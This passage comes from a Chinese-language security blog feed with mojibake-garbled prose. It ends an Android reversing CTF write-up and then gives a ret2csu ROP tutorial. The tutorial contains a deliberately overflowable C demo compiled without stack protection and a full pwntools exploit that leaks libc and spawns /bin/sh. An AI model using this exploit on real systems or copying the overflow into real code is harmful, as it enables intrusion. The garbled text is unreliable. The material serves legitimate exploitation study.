srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102201921740"></p><p>â€‹        ç„¶åé•¿æŒ‰CFF.apkï¼ŒåŠŸèƒ½-apkç­¾åã€‚</p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214843.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214843.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102202122718"></p><p>â€‹        ç„¶åå®‰è£…ï¼Œæ‹¿åˆ°flagã€‚</p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214903.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214903.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102202211016"></p><h2 id="0x02-FindPass"><a href="#0x02-FindPass" class="headerlink" title="0x02 . FindPass"></a>0x02 . FindPass</h2><p>â€‹        æ¨¡æ‹Ÿå™¨å®‰è£…apkæ‰“å¼€ç…ç…ã€‚</p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214934.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214934.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102204609589"></p><p>â€‹        jebåç¼–è¯‘apkç…ç…ã€‚</p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215016.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215016.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102204746910"></p><p>â€‹        æ¯”è¾ƒè¾“å…¥çš„å­—ç¬¦ä¸²(v5)å’Œv4æ˜¯å¦ä¸€è‡´ï¼Œä¸€è‡´åˆ™å¾—åˆ°flagã€‚</p><p>â€‹        åœ¨è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œv4å¿…ç„¶ä¼šå­˜å‚¨åˆ°å†…å­˜ä¸­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åŠ¨è°ƒæŸ¥çœ‹ã€‚åœ¨æ¨¡æ‹Ÿå™¨æ–‡ä»¶å¤¹æ‰“å¼€ç»ˆç«¯ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œå¾—åˆ°æ¨¡æ‹Ÿå™¨ç«¯å£å·ã€‚</p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215035.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215035.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102205650515"></p><p>â€‹        ç„¶åå†ç”¨ç³»ç»Ÿçš„adbè¿æ¥ä¸Šç«¯å£ã€‚</p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215224.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215224.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102205913832"></p><p>â€‹        åœ¨æ¨¡æ‹Ÿå™¨æ‰“å¼€appï¼Œç„¶ååœ¨jebæ‰“å¼€è°ƒè¯•å™¨ï¼Œé€‰æ‹©å¼€å§‹è°ƒè¯•ï¼Œå°±å¯ä»¥æ‰¾åˆ°æ¨¡æ‹Ÿå™¨çš„è¿›ç¨‹ã€‚</p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215255.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215255.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102205955349"></p><p>â€‹        é™„ä¸Šä¹‹åå¼€å§‹è°ƒè¯•ã€‚</p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215312.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215312.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102210110443"></p><p>â€‹    å‘ç°æŠ¥é”™ï¼ŒåŸæ¥æ˜¯apkè®¾ç½®æˆäº†ä¸å¯è°ƒè¯•ã€‚ç”¨apktoolsåç¼–è¯‘å‡ºæ¥ï¼Œç„¶åä¿®æ”¹xmlï¼Œåœ¨applicationæ ‡ç­¾ä¸­åŠ ä¸Š**android:debuggable=â€trueâ€**å¹¶ç”¨ç©ºæ ¼éš”å¼€ã€‚</p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215356.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215356.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102210652338"></p><p>â€‹        é‡æ–°è°ƒè¯•ï¼Œåœ¨æ ‡ç­¾90å¤„ä¸‹æ–­ç‚¹ï¼Œå·²çŸ¥v9ä¸­å­˜çš„å°±æ˜¯v4çš„flagã€‚</p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215407.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215407.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102211030315"></p><p>â€‹        æŸ¥çœ‹å±€éƒ¨å˜é‡åˆ—è¡¨ï¼Œå³å¯å‘ç°flagã€‚</p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215436.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215436.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102211410089"></p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215448.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215448.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102211451659"></p>]]></content>
      
      
      
        <tags>
            
            <tag> AndroidRe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Intermediate ROP</title>
      <link href="2020/08/19/Intermediate_ROP/"/>
      <url>2020/08/19/Intermediate_ROP/</url>
      
        <content type="html"><![CDATA[<p>â€‹        Ret2csu &amp; BROP <span id="more"></span></p><h2 id="0x00-ret2csu"><a href="#0x00-ret2csu" class="headerlink" title="0x00 . ret2csu"></a>0x00 . ret2csu</h2><h3 id="A-åŸç†"><a href="#A-åŸç†" class="headerlink" title="A . åŸç†"></a>A . åŸç†</h3><p>â€‹        è¿™ä¸ªæŠ€æœ¯ç®—æ˜¯ä¸€ä¸ªé€šç”¨çš„ropæŠ€æœ¯ï¼Œç”¨åˆ°äº†__libc_csu_init()è¿™ä¸ªå‡½æ•°ï¼Œåªè¦ç¨‹åºè°ƒç”¨äº†åº“å‡½æ•°å°±ä¸€å®šéœ€è¦è°ƒç”¨è¿™ä¸ªå‡½æ•°å¯¹åº“è¿›è¡Œåˆå§‹åŒ–ã€‚</p><p>â€‹        å†™ä¸€ä¸ªç®€å•demoï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//level5.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹        å…³é—­canaryï¼Œå…³é—­pieè¿›è¡Œ64ä½ç¼–è¯‘ã€‚ç„¶ååˆ©ç”¨objdumpå‘½ä»¤ï¼Œå¯ä»¥çœ‹åˆ°å„ä¸ªæ®µåæ±‡ç¼–çš„æƒ…å†µï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -no-pie level5.c -o level5</span><br><span class="line">objdump -d level5</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819170901.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819170901.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>â€‹        ä»”ç»†è§‚å¯Ÿè¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ä¸€ä¸‹æœ‰ç”¨çš„gadgetï¼š</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819171605.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819171605.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/><p>â€‹        å¦‚æœæˆ‘ä»¬èƒ½æ„é€ ropé“¾ï¼Œä½¿å¾—ç³»ç»Ÿå…ˆæ‰§è¡Œ1ï¼Œå†æ‰§è¡Œ2ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ§åˆ¶rdiï¼Œrsiï¼Œrdxä¸‰ä¸ªå¯„å­˜å™¨ã€‚åœ¨1å¤„ï¼Œæˆ‘ä»¬å‘ç°äº†6ä¸ªå¼¹æ ˆæ“ä½œï¼Œç³»ç»Ÿå°†æ ˆä¸Šæ•°æ®å‚¨å­˜åˆ°å¯„å­˜å™¨ä¸­ï¼Œè€Œååœ¨2å¤„æˆ‘ä»¬åˆé€šè¿‡è¿™äº›å¯„å­˜å™¨ç»™rdiï¼Œrsiï¼Œrdxè¿›è¡Œäº†èµ‹å€¼ã€‚</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819172139.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819172139.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/><p>â€‹        å› ä¸ºåæ±‡ç¼–çš„åå·®ï¼Œåœ¨idaä¸­çœ‹0x4005D9ï¼Œå‘ç°ç³»ç»Ÿéšåè°ƒç”¨äº†rbx*8+r12è¿™ä¸ªåœ°å€ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶è¿™ä¸¤ä¸ªå¯„å­˜å™¨æ¥æ§åˆ¶è°ƒç”¨åœ°å€ï¼Œè¿›è€Œå®ç°æ”»å‡»æˆ–è€…æ•°æ®æ³„éœ²ã€‚</p><p>â€‹        å®Œæ•´æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li>ç¨‹åºé€šè¿‡æº¢å‡ºè·³è½¬åˆ°1å¼€å§‹æ‰§è¡Œã€‚</li><li>ç¨‹åºæ‰§è¡Œåˆ°0x4005F4å¤„çš„retï¼Œè¿”å›åˆ°æˆ‘ä»¬é€šè¿‡æº¢å‡ºè€Œé¢„è®¾çš„è¿”å›åœ°å€ï¼Œå³2å¤„ã€‚</li><li>ç¨‹åºä»2å¤„ä¸€ç›´å¾€ä¸‹æ‰§è¡Œï¼Œ0x4005D9å¤„è°ƒç”¨å®Œå‡½æ•°åè¿”å›åˆ°0x4005DDç»§ç»­æ‰§è¡Œã€‚</li><li>æ‰§è¡Œ0x4005DDï¼Œä½¿å¾—rbxå¯„å­˜å™¨+1ï¼Œæ¥ç€æ¯”è¾ƒrbxï¼Œrbpï¼Œå¦‚æœç›¸ç­‰åˆ™ä¸è·³è½¬ï¼Œæ¥ç€å¾€ä¸‹æ‰§è¡Œã€‚å› æ­¤è¿™é‡Œæˆ‘ä»¬éœ€è¦é¢„è®¾å¯„å­˜å™¨çš„å€¼ä½¿å¾—rbxï¼Œrbpæ»¡è¶³ä¸è·³è½¬çš„æ¡ä»¶ã€‚ä¹Ÿå°±æ˜¯è¦è®©rbx+1 == rbpã€‚</li><li>å†æ¬¡æ‰§è¡Œåˆ°0x4005F4å¤„çš„retï¼Œropé“¾ç»“æŸã€‚</li></ol><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819190913.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819190913.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:80%;" /><p>â€‹        å½“ç„¶ï¼Œè¯¥æŠ€æœ¯ä¹Ÿæœ‰ä¸€äº›éœ€è¦æ³¨æ„çš„ç‚¹ï¼š</p><ol><li>0x4005D6ä¸­çš„èµ‹å€¼åªæ˜¯å¯¹edièµ‹å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´ä»…æ”¹å˜äº†rdiå¯„å­˜å™¨çš„ä½32ä½ï¼Œå¦‚æœrdiæœ¬èº«æ•°å€¼è¿‡å¤§ï¼Œåˆ™éœ€è¦å¦å¤–æ‰¾gadgetã€‚</li><li>ä¸ºäº†è®©rbx+1 == rbpï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•åœ°è®¾ç½®è®©rbx = 0ï¼Œrbp = 1ã€‚</li><li>å› ä¸ºéœ€è¦ä¸¤æ¬¡ç»è¿‡1å¤„ï¼Œæ‰€ä»¥åä¸€æ¬¡ç»è¿‡çš„æ—¶å€™ä¹Ÿéœ€è¦è®¾ç½®6ä¸ªå¯„å­˜å™¨çš„å€¼(åƒåœ¾å€¼å³å¯)ï¼Œç„¶åå†åŠ ä¸Šæœ€åçš„è¿”å›åœ°å€ï¼Œæ¥é¿å…ç¨‹åºå´©æºƒã€‚</li></ol><h3 id="B-ç¤ºä¾‹"><a href="#B-ç¤ºä¾‹" class="headerlink" title="B . ç¤ºä¾‹"></a>B . ç¤ºä¾‹</h3><p>â€‹        ç”¨level5è§£é¢˜è¿›è¡Œæ¼”ç¤ºã€‚</p><p>â€‹        æ—¢ç„¶æœ‰gadgetäº†ï¼Œé‚£ä¹ˆæ€è·¯å°±æ¯”è¾ƒæ¸…æ™°äº†ï¼š</p><ol><li>é€šè¿‡ret2csuè®¾ç½®rbxä¸º0ï¼Œrbpä¸º1ï¼Œr12ä¸ºéœ€è¦æ‰§è¡Œçš„å‡½æ•°åœ°å€ï¼Œr13ï¼Œr14ï¼Œr15ï¼Œåˆ†åˆ«ä¸ºr12å‡½æ•°çš„å‚æ•°ï¼Œretè®¾ç½®è¿”å›åœ°å€ï¼Œæ¯”å¦‚mainã€‚</li><li>ç¬¬ä¸€æ¬¡ret2csuï¼Œå°†write_gotå†™å…¥ropé“¾ï¼Œæ³„éœ²å‡ºwriteçš„çœŸå®åœ°å€ï¼Œå†è®¡ç®—libcå’Œå…¶ä»–æ‰€éœ€åœ°å€ã€‚</li><li>ç¬¬äºŒæ¬¡ret2csuï¼Œå°†read_gotå†™å…¥ropé“¾ï¼Œå°†systemåœ°å€å’Œâ€/bin/shâ€å­—ç¬¦ä¸²å†™å…¥åˆ°bssæ®µã€‚</li><li>ç¬¬ä¸‰æ¬¡ret2csuï¼Œå°†bss_addrå†™å…¥ropé“¾ï¼Œå‚æ•°ä¸ºbss_addr + 8ï¼Œåˆ™æ‰§è¡Œexecve(â€œ/bin/shâ€,0,0);</li></ol><p>â€‹        å½“ç„¶ï¼Œæœ€åä¸€æ¬¡ret2csuï¼Œç”¨systemå‡½æ•°ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ä¸è¿‡æˆ‘è²Œä¼¼æ²¡æˆåŠŸã€‚è€Œä¸”ç†è®ºä¸Šç›´æ¥è°ƒç”¨execveåœ°å€å°±å®Œäº†ï¼Œæ²¡å¿…è¦å†™åœ¨bssä¸Šï¼Œä½†æ˜¯å®é™…æ“ä½œä¸Šå´è¡Œä¸æ‡‚ã€‚æš‚æ—¶å­˜ç–‘ã€‚</p><p><strong>Exploit</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./level5&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./level5&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<span class="comment">#&quot;ldd level5&quot; to figuer out the libc version</span></span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">bss_addr = <span class="number">0x601038</span></span><br><span class="line">main_addr = <span class="number">0x400558</span></span><br><span class="line">write_offset = libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">execve_offset = libc.symbols[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> execve_offset</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx,rbp,r12,r13,r14,r15,ret</span>):</span></span><br><span class="line">payload = <span class="number">136</span>*<span class="string">&#x27;A&#x27;</span></span><br><span class="line">payload +=  p64(<span class="number">0x4005e6</span>)<span class="comment"># gadget1modify r13,r14,r15</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment"># padding</span></span><br><span class="line">payload += p64(rbx)<span class="comment"># rbx</span></span><br><span class="line">payload += p64(rbp)<span class="comment"># rbp</span></span><br><span class="line">payload += p64(r12)<span class="comment"># call addr</span></span><br><span class="line">payload += p64(r13)<span class="comment"># rdi</span></span><br><span class="line">payload += p64(r14)<span class="comment"># rsi</span></span><br><span class="line">payload += p64(r15)<span class="comment"># rdx</span></span><br><span class="line">payload += p64(<span class="number">0x4005d0</span>)<span class="comment"># gadget2modify rdi,rsi,rdx</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">0x38</span><span class="comment"># padding again for register</span></span><br><span class="line">payload += p64(ret)<span class="comment"># ret</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, World&quot;</span>)</span><br><span class="line">csu(<span class="number">0</span>,<span class="number">1</span>,write_got,<span class="number">1</span>,write_got,<span class="number">8</span>,main_addr)</span><br><span class="line">temp = p.recv(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#write_addr = u64(temp.ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line">write_addr = <span class="number">0x7ffff7af4140</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;here is write_addr:&quot;</span> +<span class="built_in">hex</span>(write_addr)</span><br><span class="line">libc_addr = write_addr - write_offset</span><br><span class="line">execve_addr = libc_addr + execve_offset</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Now we know the execve_addr:&quot;</span>,</span><br><span class="line"><span class="built_in">print</span> execve_addr</span><br><span class="line">bin_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, World&quot;</span>)</span><br><span class="line">csu(<span class="number">0</span>,<span class="number">1</span>,read_got,<span class="number">0</span>,bss_addr,<span class="number">16</span>,main_addr)</span><br><span class="line">p.send(p64(execve_addr) + <span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)#To see if you write the data successfully</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, World&quot;</span>)</span><br><span class="line">csu(<span class="number">0</span>,<span class="number">1</span>,bss_addr,bss_addr+<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,execve_addr)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="C-å°æŠ€å·§"><a href="#C-å°æŠ€å·§" class="headerlink" title="C . å°æŠ€å·§"></a>C . å°æŠ€å·§</h3><p>â€‹        æˆ‘ä»¬ç›´æ¥çœ‹__libc_csu_init()å‘ç°0x4005eaåˆ°0x4005f3å¹¶ä¸æ˜¯æ¯ä¸ªå­—èŠ‚å„è¡¨ç¤ºä¸€æ¡æ±‡ç¼–è¯­å¥ï¼Œæœ‰å‡ å¥å äº†ä¸¤ä¸ªå­—èŠ‚ã€‚</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819204254.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819204254.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/><p>â€‹        ç„¶è€Œç›´æ¥çœ‹0x4005edçš„è¯ï¼Œæˆ‘ä»¬ä¼šå‘ç°æ­¤å¤„çš„æ±‡ç¼–è¯­å¥æ˜¯pop rsp;</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819204817.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819204817.png" 